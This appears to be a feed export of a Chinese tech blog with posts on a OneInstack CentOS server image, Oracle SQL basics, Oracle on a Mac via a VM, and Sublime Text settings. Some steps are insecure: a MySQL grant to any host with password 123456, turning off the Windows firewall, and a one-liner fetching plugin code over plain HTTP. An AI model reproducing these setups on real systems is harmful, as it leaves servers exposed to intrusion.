      <content type="html"><![CDATA[<p>操作系统:CentOS 6.5 64 位<br>多语言环境(CentOS 6.5 64 位 | Nginx | PHP5.4 | JAVA)V 1.3<br><a id="more"></a><br>软件版本详细:  </p>
<ul>
<li>Nginx1.9.12  </li>
<li>PHP5.3.29、PHP5.4.45、PHP5.5.32、PHP5.6.18、PHP7.0.3 </li>
<li>Tomcat7.0.68    </li>
<li>JDK1.6.0_45、JDK1.7.0_80、JDK1.8.0_74  </li>
<li>MySQL5.6.29  </li>
<li>Redis3.0.7  </li>
<li>Memcached1.4.25  </li>
<li>Jemalloc4.0.4  </li>
<li>Pure-FTPd1.0.42  </li>
<li>phpMyAdmin4.4.15.4<br>源码安装目录:  <figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="string">PHP:</span><span class="regexp">/usr/</span>local/php  </div><div class="line"><span class="string">JDK:</span> <span class="regexp">/usr/</span>java  </div><div class="line"><span class="string">Tomcat:</span><span class="regexp">/usr/</span>local/tomcat  </div><div class="line"><span class="string">MySQL:</span><span class="regexp">/usr/</span>local<span class="regexp">/mysql Pureftpd:/</span>usr<span class="regexp">/local/</span>pureftpd  </div><div class="line"><span class="string">Redis:</span> <span class="regexp">/usr/</span>local<span class="regexp">/redis Memcached:/</span>usr<span class="regexp">/local/</span>memcached   </div><div class="line"><span class="string">phpMyAdmin:</span><span class="regexp">/data/</span>wwwroot<span class="regexp">/default/</span>phpMyAdmin  </div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="一-参数优化"><a href="#一-参数优化" class="headerlink" title="一.参数优化"></a>一.参数优化</h2><p>由于镜像制作是下 2 核 2G 内存配置完成,Nginx、MySQL、PHP、JDK 参数 还是该配置的参数,强烈建议如果不是这个配置,请执行下面优化脚本:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cd</span> /root/oneinstack #必须进入 oneinstack 目录下执行</div><div class="line">./optimize.<span class="keyword">sh</span> #请勿 bash ./optimize.<span class="keyword">sh</span>(或者 <span class="keyword">sh</span>)这样执行</div></pre></td></tr></table></figure></p>
<h2 id="二-PHP-版本切换"><a href="#二-PHP-版本切换" class="headerlink" title="二.PHP 版本切换"></a>二.PHP 版本切换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /root/oneinstack <span class="comment">#必须进入 oneinstack 目录下执行 </span></div><div class="line">./change_php_version.sh <span class="comment">#请勿 bash (或者 sh)这样执行</span></div></pre></td></tr></table></figure>
<h2 id="三-JDK-版本切换"><a href="#三-JDK-版本切换" class="headerlink" title="三.JDK 版本切换"></a>三.JDK 版本切换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /root/oneinstack <span class="comment">#必须进入 oneinstack 目录下执行 </span></div><div class="line">./change_php_version.sh <span class="comment">#请勿 bash (或者 sh)这样执行</span></div></pre></td></tr></table></figure>
<h2 id="四-数据库默认-root-密码"><a href="#四-数据库默认-root-密码" class="headerlink" title="四.数据库默认 root 密码"></a>四.数据库默认 root 密码</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cd</span> /root/oneinstack #必须进入 oneinstack 目录下执行 </div><div class="line"><span class="keyword">grep</span> dbrootpwd <span class="keyword">options</span>.<span class="keyword">conf</span> #显示数据库 root 密码</div></pre></td></tr></table></figure>
<h2 id="五-更改数据库-root-密码"><a href="#五-更改数据库-root-密码" class="headerlink" title="五.更改数据库 root 密码"></a>五.更改数据库 root 密码</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd <span class="regexp">/root/</span>oneinstack <span class="comment">#必须进入 oneinstack 目录下执行 </span></div><div class="line">.<span class="regexp">/reset_db_root_password.sh</span></div></pre></td></tr></table></figure>
<h2 id="六-创建数据库用户"><a href="#六-创建数据库用户" class="headerlink" title="六.创建数据库用户"></a>六.创建数据库用户</h2><p>如:添加一个用户名为 db_user,密码为 123456,授权为本机 localhost 对 database 数据库所有权限,命令如下<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql -uroot –p</div><div class="line">MySQL [(none)]&gt; grant all privileges on database.* to db_user@<span class="string">'localhost'</span> identified by <span class="string">'123456'</span>; <span class="comment">#授权语句,特别注意有分号</span></div><div class="line">MySQL [(none)]&gt; flush privileges; <span class="comment">#权限立即生效</span></div><div class="line">MySQL [(none)]&gt; <span class="keyword">exit</span>; <span class="comment">#退出数据库控制台,特别注意有分号</span></div></pre></td></tr></table></figure></p>
<h2 id="七-配置-MySQL-远程连接"><a href="#七-配置-MySQL-远程连接" class="headerlink" title="七.配置 MySQL 远程连接"></a>七.配置 MySQL 远程连接</h2><p>①打开 iptables 3306 端口<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT <span class="number">4</span> -p tcp -m <span class="keyword">state</span> --state NEW -m tcp --dport <span class="number">3306</span> -j ACCEPT</div><div class="line">service iptables save <span class="comment">#保存 iptables 规则</span></div></pre></td></tr></table></figure></p>
<p>②数据库授权<br>如:添加一个用户名为 linuxeye,密码为 123456,授权为% (%表示所有 ip 能连接,可以设置指定 ip)对 oneinstack 数据库所有权限,命令如下<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql –uroot –p</div><div class="line">MySQL [(none)]&gt; grant all privileges on oneinstack.* to linuxeye@<span class="string">'%'</span> identified by <span class="string">'123456'</span>; <span class="comment">#授权语句,特别注意有分号</span></div><div class="line">MySQL [(none)]&gt; flush privileges;</div><div class="line">MySQL [(none)]&gt; <span class="keyword">exit</span>; <span class="comment">#退出数据库控制台,特别注意有分号</span></div></pre></td></tr></table></figure></p>
<h2 id="八-管理-FTP-账号"><a href="#八-管理-FTP-账号" class="headerlink" title="八.管理 FTP 账号"></a>八.管理 FTP 账号</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cd</span> /root/oneinstack #必须进入 oneinstack 目录下执行</div><div class="line">./pureftpd_vhost.<span class="keyword">sh</span> #请勿 bash ./pureftpd_vhost.<span class="keyword">sh</span>(或者 <span class="keyword">sh</span>)这样执行</div></pre></td></tr></table></figure>
<h2 id="九-如何管理服务"><a href="#九-如何管理服务" class="headerlink" title="九.如何管理服务"></a>九.如何管理服务</h2><p>Nginx:<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service nginx &#123;start|<span class="type">stop</span>|<span class="type">status</span>|<span class="type">restart</span>|<span class="type">reload</span>|<span class="type">configtest</span>&#125; 注:如手工更改配置文件,强烈建议 reload</div></pre></td></tr></table></figure><br>MySQL:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service <span class="keyword">mysqld</span> &#123;<span class="literal">start</span>|<span class="literal">stop</span>|<span class="literal">restart</span>|reload|<span class="literal">status</span>&#125;</div></pre></td></tr></table></figure><br>PHP:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service php-<span class="keyword">fpm</span> &#123;<span class="literal">start</span>|<span class="literal">stop</span>|<span class="literal">restart</span>|reload|<span class="literal">status</span>&#125;</div></pre></td></tr></table></figure><br>Tomcat:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service <span class="keyword">tomcat</span> &#123;<span class="literal">start</span>|<span class="literal">stop</span>|<span class="literal">status</span>|<span class="literal">restart</span>&#125;</div></pre></td></tr></table></figure><br>Pure-Ftpd:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service <span class="keyword">pureftpd</span> &#123;<span class="literal">start</span>|<span class="literal">stop</span>|<span class="literal">restart</span>|<span class="literal">status</span>&#125;</div></pre></td></tr></table></figure><br>Redis:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service redis-<span class="keyword">server</span> &#123;<span class="literal">start</span>|<span class="literal">stop</span>|<span class="literal">status</span>|<span class="literal">restart</span>|reload&#125;</div></pre></td></tr></table></figure><br>Memcached:<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service <span class="keyword">memcached</span> &#123;<span class="literal">start</span>|<span class="literal">stop</span>|<span class="literal">status</span>|<span class="literal">restart</span>|reload&#125;</div></pre></td></tr></table></figure></p>
<h2 id="十-关于网站根目录权限"><a href="#十-关于网站根目录权限" class="headerlink" title="十.关于网站根目录权限"></a>十.关于网站根目录权限</h2><p>网站根目录权限遵循:<br>文件 644, 文件夹 755 ,权限用户和用户组 www 如出现文件权限问题时,请执行下面 3 条命令:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">chown</span> -<span class="type">R</span> www.www /<span class="class"><span class="keyword">data</span>/wwwroot/</span></div><div class="line"><span class="title">find</span> /<span class="class"><span class="keyword">data</span>/wwwroot/ -<span class="keyword">type</span> d -exec chmod 755 &#123;&#125; \; </span></div><div class="line"><span class="title">find</span> /<span class="class"><span class="keyword">data</span>/wwwroot/ -<span class="keyword">type</span> f -exec chmod 644 &#123;&#125; \;</span></div></pre></td></tr></table></figure></p>
<h2 id="十一、关于防火墙-iptables"><a href="#十一、关于防火墙-iptables" class="headerlink" title="十一、关于防火墙(iptables)"></a>十一、关于防火墙(iptables)</h2><p>默认情况下开通 22(ssh)80、443(Nginx) 21、20000:30000(FTP) 其它端口都拒绝,如下需要允许其它端口,请如下操作(如开启 8080 端口)<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># iptables -I INPUT <span class="number">4</span> -p tcp -m <span class="section">state</span> --<span class="section">state</span> NEW -m tcp --dport <span class="number">8080</span> -j ACCEPT #允许 <span class="number">8080</span> 端口</div><div class="line">#service iptables save #保存 iptables 规则</div></pre></td></tr></table></figure></p>
<p>删除规则<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -L -n  --<span class="built_in">line</span>-number</div><div class="line">iptables -D <span class="literal">INPUT</span> <span class="number">4</span></div></pre></td></tr></table></figure></p>
<h2 id="十二、查看端口"><a href="#十二、查看端口" class="headerlink" title="十二、查看端口"></a>十二、查看端口</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -ntlp   <span class="comment">//查看当前所有tcp端口·</span></div><div class="line">netstat -ntulp |<span class="keyword">grep</span> <span class="number">80</span>   <span class="comment">//查看所有80端口使用情况·</span></div><div class="line">netstat -an | <span class="keyword">grep</span> <span class="number">3306</span>   <span class="comment">//查看所有3306端口使用情况·</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Oracle数据库的操作]]></title>
      <url>/2016/03/15/Database/oracle%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>Oracle数据库中有一个Sql Plus，可以使用命令行进行一系列的数据库操作，学习导入数据，增删改查的基本命令。<br><a id="more"></a></p>
<h2 id="一、导入dmp文件"><a href="#一、导入dmp文件" class="headerlink" title="一、导入dmp文件"></a>一、导入dmp文件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sys as sysdba</div><div class="line"><span class="keyword">grant</span> dba <span class="keyword">to</span> scott;</div><div class="line"><span class="keyword">commit</span>;</div><div class="line">host imp username/pwd file=filename.dmp full=y;</div></pre></td></tr></table></figure>
<h2 id="二、各种操作"><a href="#二、各种操作" class="headerlink" title="二、各种操作"></a>二、各种操作</h2><p>创建表空间<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create tablespace tablespace_name datafile (<span class="name">filename</span>.dpf) size (<span class="name">xx</span>)</div></pre></td></tr></table></figure></p>
<p>显示该表内容<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">desc db<span class="built_in">a_data</span>_files</div></pre></td></tr></table></figure></p>
<p>找出文件路径<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> file_name <span class="keyword">from</span> dba_data_files <span class="keyword">where</span> tablespace_name = ‘’;</div></pre></td></tr></table></figure></p>
<p>向表空间增加文件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">tablespace</span> tablespace_name <span class="keyword">add</span> <span class="keyword">datafile</span> ‘filename.dpf’;</div></pre></td></tr></table></figure></p>
<p>表空间的脱机和开机<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">tablespace</span> tablespacename <span class="keyword">online</span>/<span class="keyword">offline</span>;</div></pre></td></tr></table></figure></p>
<p>删除表空间中的文件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">tablespace</span> tablespace_name <span class="keyword">drop</span> <span class="keyword">datafile</span> ‘filename.dpf’;</div></pre></td></tr></table></figure></p>
<p>删除表空间<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span> <span class="keyword">tablespace</span> tablespace_name <span class="keyword">including</span> <span class="keyword">contents</span>;</div></pre></td></tr></table></figure></p>
<p>建表<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">create table userinfo</div><div class="line">(</div><div class="line">  <span class="name">id</span> number(<span class="number">6</span>,<span class="number">0</span>),</div><div class="line">  username varchar2(<span class="number">20</span>),</div><div class="line">  userpwd varchar2(<span class="number">20</span>),</div><div class="line">  email varchar2(<span class="number">20</span>),</div><div class="line">  regdate date</div><div class="line">)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>展示表<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">desc userinfo<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>增加字段<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">add</span> column_name datatype;</div></pre></td></tr></table></figure></p>
<p>更改字段数据类型<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">modify</span> column_name datatype;</div></pre></td></tr></table></figure></p>
<p>删除字段<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">drop</span> <span class="keyword">column</span> column_name;</div></pre></td></tr></table></figure></p>
<p>修改字段名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">rename</span> <span class="keyword">column</span> column_name <span class="keyword">to</span> new_column_name;</div></pre></td></tr></table></figure></p>
<p>修改表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">rename</span> table_name <span class="keyword">to</span> new_table_name;</div></pre></td></tr></table></figure></p>
<p>删除表数据<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">truncate <span class="keyword">table</span> table_name</div></pre></td></tr></table></figure></p>
<p>删除表结构<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">drop <span class="keyword">table</span> table_name</div></pre></td></tr></table></figure></p>
<p>增加数据<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name （column1，column2…) <span class="keyword">VALUES</span>(value1,value2…)</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> database </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Oracle </tag>
            
            <tag> Sql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac下的Oracle数据库的安装]]></title>
      <url>/2016/03/06/Database/oracle%E5%AE%89%E8%A3%85/</url>
      <content type="html"><![CDATA[<p>不知不觉的已经大二下了，在今后的旅途中依旧迷茫，在创新实践这门课上选了Java Web，不知能走多远，且行且珍惜吧。课题是对大数据的可视化分析，首先需要学习oracle数据库，发现oracle自从10g版本后再也不提供对mac支持的版本了，只好回windows的坑，寻找解决办法。<br><a id="more"></a></p>
<h2 id="一、安装windows"><a href="#一、安装windows" class="headerlink" title="一、安装windows"></a>一、安装windows</h2><p>从网上了解到java web开发可以在mac下进行，不需要双系统，装个类似于parallels desktop的虚拟机就可以啦，找个win10镜像，然后就解决环境问题了。大致思路是在windows环境下使用oracle数据库，而在mac环境下进行开发，像navicat、sql developer都可以通过访问虚拟机来获取数据库信息.  </p>
<h2 id="二、下载oracle安装包"><a href="#二、下载oracle安装包" class="headerlink" title="二、下载oracle安装包"></a>二、下载oracle安装包</h2><p>我装的是11g，直接在oracle官网上下载，一共有两个文件，解压之后需要合并在一起，之后是傻瓜式安装，在口令管理处，解锁SCOTT账户，默认密码是tiger。安装成功，可以通过sql plus来进入数据库。接下来是一些具体的设置来实现oracle与mac的对接。  </p>
<h2 id="三、oracle与mac的连接"><a href="#三、oracle与mac的连接" class="headerlink" title="三、oracle与mac的连接"></a>三、oracle与mac的连接</h2><p>1、打开Net Manager,在服务命名的orcl中更改localhost为你当前的虚拟机的ip，监听程序下的LISTENER也更改ip。<br><img src="/images/NetManager.png" alt="NetManager">  </p>
<p>在C:\app\Kevin\product\11.2.0\dbhome_1\NETWORK\ADMIN路径下查看listener.ora和tnsnames.ora<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> #listener.ora Network Configuration File: C:<span class="symbol">\a</span>pp<span class="symbol">\K</span>evin<span class="symbol">\p</span>roduct<span class="symbol">\1</span>1.2.0<span class="symbol">\d</span>bhome_1<span class="symbol">\N</span>ETWORK<span class="symbol">\A</span>DMIN<span class="symbol">\l</span>istener.ora  </div><div class="line"> #Generated by Oracle configuration tools.  </div><div class="line"></div><div class="line">SID_LIST_LISTENER =</div><div class="line">  (SID_LIST =</div><div class="line">    (SID_DESC =</div><div class="line">      (SID_NAME = CLRExtProc)</div><div class="line">      (ORACLE_HOME = C:<span class="symbol">\a</span>pp<span class="symbol">\K</span>evin<span class="symbol">\p</span>roduct<span class="symbol">\1</span>1.2.0<span class="symbol">\d</span>bhome_1)</div><div class="line">      (PROGRAM = extproc)</div><div class="line">      (ENVS = "EXTPROC_DLLS=ONLY:C:<span class="symbol">\a</span>pp<span class="symbol">\K</span>evin<span class="symbol">\p</span>roduct<span class="symbol">\1</span>1.2.0<span class="symbol">\d</span>bhome_1<span class="symbol">\b</span>in<span class="symbol">\o</span>raclr11.dll")</div><div class="line">    )</div><div class="line">    (SID_DESC =</div><div class="line">      (SID_NAME = ORCL)</div><div class="line">      (ORACLE_HOME = C:<span class="symbol">\a</span>pp<span class="symbol">\K</span>evin<span class="symbol">\p</span>roduct<span class="symbol">\1</span>1.2.0<span class="symbol">\d</span>bhome_1)</div><div class="line">      (GLOBAL_DBNAME = ORCL)</div><div class="line">    )</div><div class="line">  )</div><div class="line"></div><div class="line">LISTENER =</div><div class="line">  (DESCRIPTION_LIST =</div><div class="line">    (DESCRIPTION =</div><div class="line">      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))</div><div class="line">    )</div><div class="line">    (DESCRIPTION =</div><div class="line">      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.211.55.24)(PORT = 1521))</div><div class="line">    )</div><div class="line">  )</div><div class="line"></div><div class="line">ADR_BASE_LISTENER = C:<span class="symbol">\a</span>pp<span class="symbol">\K</span>evin</div><div class="line"></div></pre></td></tr></table></figure></p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#tnsnames.ora Network Configuration File: C:\app\Kevin\product\11.2.0\dbhome_1\NETWORK\ADMIN\tnsnames.ora</span></div><div class="line"> <span class="comment">#Generated by Oracle configuration tools.</span></div><div class="line"></div><div class="line"><span class="attr">ORACLR_CONNECTION_DATA</span> =</div><div class="line">  (<span class="attr">DESCRIPTION</span> =</div><div class="line">    (<span class="attr">ADDRESS_LIST</span> =</div><div class="line">      (<span class="attr">ADDRESS</span> = (<span class="attr">PROTOCOL</span> = IPC)(<span class="attr">KEY</span> = EXTPROC1521))</div><div class="line">    )</div><div class="line">    (<span class="attr">CONNECT_DATA</span> =</div><div class="line">      (<span class="attr">SID</span> = CLRExtProc)</div><div class="line">      (<span class="attr">PRESENTATION</span> = RO)</div><div class="line">    )</div><div class="line">  )</div><div class="line"></div><div class="line"><span class="attr">LISTENER_ORCL</span> =</div><div class="line">  (<span class="attr">ADDRESS</span> = (<span class="attr">PROTOCOL</span> = TCP)(<span class="attr">HOST</span> = localhost)(<span class="attr">PORT</span> = <span class="number">1521</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="attr">ORCL</span> =</div><div class="line">  (<span class="attr">DESCRIPTION</span> =</div><div class="line">    (<span class="attr">ADDRESS_LIST</span> =</div><div class="line">      (<span class="attr">ADDRESS</span> = (<span class="attr">PROTOCOL</span> = TCP)(<span class="attr">HOST</span> = <span class="number">10.211</span>.<span class="number">55.24</span>)(<span class="attr">PORT</span> = <span class="number">1521</span>))</div><div class="line">    )</div><div class="line">    (<span class="attr">CONNECT_DATA</span> =</div><div class="line">      (<span class="attr">SERVER</span> = DEDICATED)</div><div class="line">      (<span class="attr">SERVICE_NAME</span> = orcl)</div><div class="line">    )</div><div class="line">  )</div><div class="line"></div></pre></td></tr></table></figure>
<p>2、将windows的防火墙关闭  </p>
<p>3、在虚拟机上设置为共享网络，网上说是桥接，自己尝试吧  </p>
<p>4、在mac上下载navicat或sql developer对oracle数据库进行连接<br><img src="/images/Navicat.png" alt="Navicat"><br><img src="/images/Sqldeveloper.png" alt="SqlDeveloper"></p>
]]></content>
      
        <categories>
            
            <category> database </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Sublime Text的配置]]></title>
      <url>/2015/11/09/Tools/sublime/</url>
      <content type="html"><![CDATA[<p>Sublime Text：一款具有代码高亮、语法提示、自动完成且反应快速的编辑器软件，不仅具有华丽的界面，还支持插件扩展机制，用她来写代码，绝对是一种享受。<br><a id="more"></a>  </p>
<h2 id="一、安装package-control"><a href="#一、安装package-control" class="headerlink" title="一、安装package control"></a>一、安装package control</h2><p>按Ctrl+`调出console<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib.request,os; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); <span class="built_in">open</span>(os.path.join(ipp, pf), <span class="string">'wb'</span>).<span class="built_in">write</span>(urllib.request.urlopen( <span class="string">'http://sublime.wbond.net/'</span> + pf.replace(<span class="string">' '</span>,<span class="string">'%20'</span>)).<span class="built_in">read</span>())</div></pre></td></tr></table></figure></p>
<h2 id="二、修改个人配置"><a href="#二、修改个人配置" class="headerlink" title="二、修改个人配置"></a>二、修改个人配置</h2><p>字体大小<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="string">"font_size"</span>: <span class="number">17</span>  </div></pre></td></tr></table></figure>  </p>
<p>高亮编辑中的那一行<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"highlight_line":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>焦点丢失后自动保存<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"save_on_focus_lost":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>显示当前文件的编码<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"show_encoding":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>保存的时候把无用的空格去掉<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"trim_trailing_white_space_on_save":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>Tab转换<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"tab_size":</span> <span class="number">2</span><span class="string">,</span>  </div><div class="line"><span class="attr">"translate_tabs_to_spaces":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>自动换行<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"word_wrap":</span> <span class="literal">false</span>  </div></pre></td></tr></table></figure>  </p>
<p>宽度指导线<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="string">"rulers"</span>: <span class="string">[80]</span>    </div></pre></td></tr></table></figure>  </p>
<p>拼写检查<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"spell_check":</span> <span class="literal">false</span>     </div></pre></td></tr></table></figure>  </p>
<p>要不要滚过头<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"scroll_past_end":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>加粗文件夹名称<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"bold_folder_labels":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
